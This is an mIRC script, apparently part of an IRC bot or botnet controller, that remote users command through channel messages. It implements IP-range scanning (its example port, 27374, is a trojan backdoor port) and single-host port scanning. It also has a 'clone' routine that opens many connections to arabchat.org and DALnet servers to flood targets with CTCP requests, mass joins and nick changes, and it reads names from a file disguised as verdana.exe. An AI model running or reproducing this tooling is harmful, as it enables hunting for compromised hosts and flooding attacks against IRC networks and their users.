   ctcp 700:!version:*: { notice $nick %quit }
   on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
   on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }
   on 700:TEXT:!scanStatus:*: {
     if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
     else { .msg $nick No Scans In Progress }
   }
   on 700:TEXT:!scanAbort:*: {
     if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
     else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
   }
   on 700:TEXT:!scan *:*: {
     if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
     if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
     else {
       set %scan.Start1 $gettok($2,1,46)
       set %scan.Start2 $gettok($2,2,46)
       set %scan.Start3 $gettok($2,3,46)
       set %scan.Start4 $gettok($2,4,46)
       set %scan.Perm1 $gettok($2,1,46)
       set %scan.Perm2 $gettok($2,2,46)
       set %scan.Perm3 $gettok($2,3,46)
       set %scan.Perm4 $gettok($2,4,46)
       set %scan.End1 $gettok($3,1,46)
       set %scan.End2 $gettok($3,2,46)
       set %scan.End3 $gettok($3,3,46)
       set %scan.End4 $gettok($3,4,46)
       if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
       if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
       set %scan.port $4
       set %scan.delay $5
       set %scan.nick $nick
       .timerscan 0 %scan.delay scancheck
       .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
     }
   }
   alias portscan {
     .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start
     inc %port.start 1
     if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }
   }
   alias portsock {
     if ($sock(port*,0) = 0) {
       .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again
       unset %port.*
       .timerportsock off
     }
   }
   on *:SOCKOPEN:port*: {
     if ($sockerr > 0) { .sockclose $sockname | halt }
     .msg %port.nick Address: $gettok($remove($sockname,port),2-,46) Port: $gettok($remove($sockname,port),1,46)
     .sockclose $sockname
   }
   alias scancheck {
     if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
     if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
     if ($count(%scan.port,$chr(44)) >= 1) {
       set %scan.counter 0
       set %scan.countport $count(%scan.port,$chr(44))
       inc %scan.countport 1
       :start
       inc %scan.counter 1
       .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
       if (%scan.counter >= %scan.countport) { goto end }
       else { goto start }
     }
     else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
     :end
     inc %scan.start4 1
     if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
     if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
     if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
     if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
   }
   on 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }
     elseif (%port.nick != $null) { .msg $nick I am currently scanning %port.address  on ports %port.perm to %port.end  i'm currently at %port.start its estimated another $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) before i'm done
     }
   }
   on 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }
   on 700:TEXT:!portscan *:*: {
     if ($4 = $null) { msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 5 | halt }
     if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning  $+ %port.perm $+  to  $+ %port.end $+  on  $+ %port.address $+  | halt }
     if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 1 | halt }
     if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }
     set %port.address $2
     set %port.start $3
     set %port.end $4
     set %port.perm $3
     set %port.delay $5
     set %port.nick $nick
     .timerport 0 %port.delay portscan
     .msg %port.nick now scanning  $+ %port.address $+  on Ports %port.start to %port.end with a delay of %port.delay  estimated time to finish, $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))
   }
   alias clone {
     if ($1 == in) {  if ($2 == PING) {  sockwrite -tn $sockname PONG $3  }  }
     if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }  }
     if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
     if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
     if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
     if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
     if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
     if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
     if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
     if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
     if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
     if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  }
     if ($1 == arabchat) {  if ($2 == $null) { halt } | set %clone.server $gettok(kuwaitna@Khiran@UAE@ArabGate@Q8@Bahrain@Empire@kuwait@KSA@Gulf@Qatar@Doha@irc@, $+ $rand(1,13) $+ ,64) $+ .arabchat.org | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  }
     if ($1 == dalnet) {  if ($2 == $null) { halt } | set %clone.server $gettok(toronto@brian@arcor@borg@ced@gaston@valhall@omen@powertech@zone@fork@spork@astro@coins@wombat@jade@liberty@dragons@nexgo@sniper@irc@twisted@, $+ $rand(1,22) $+ ,64) $+ .dal.net | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  }
     if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
   if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } }
